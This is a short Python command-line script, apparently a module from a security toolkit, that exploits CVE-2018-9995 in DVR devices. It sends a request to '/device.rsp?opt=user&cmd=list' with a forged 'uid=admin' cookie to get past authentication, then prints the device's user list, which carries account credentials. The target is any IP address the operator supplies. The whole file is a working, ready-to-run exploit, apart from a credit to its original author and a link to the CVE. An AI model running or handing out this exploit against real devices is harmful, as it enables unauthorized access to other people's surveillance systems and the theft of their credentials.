import json
import sys

import click
import requests

details = '''
 # This module it's totally based on the work of Ezequiel Fernandez (@capitan_alfa)
 # Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9995
'''

@click.command()
@click.argument('ip')
@click.option('-p', 'port', default=80, help='Port to use (default: 80)')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_cve_2018_9995(ip, port, verbose):

    url = 'http://' + ip + ':' + str(port)
    fullhost = url + '/device.rsp?opt=user&cmd=list'

    headers = {
        'Host': ip,
        'User-Agent': 'Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Languag': 'es-AR,en-US;q=0.7,en;q=0.3',
        'Connection': 'close',
        'Content-Type': 'text/html',
        'Cookie': 'uid=admin',
    }

    try:
        r = requests.get(fullhost, headers=headers,timeout=10.000)
    except Exception as e:
        print('Exception:', e)
        sys.exit(1)

    try:
        data = r.json()
    except Exception as e:
        print('Exception:', e)
        sys.exit(1)

    print(json.dumps(data["list"], indent=4))


if __name__ == '__main__':
    cmd_cve_2018_9995()

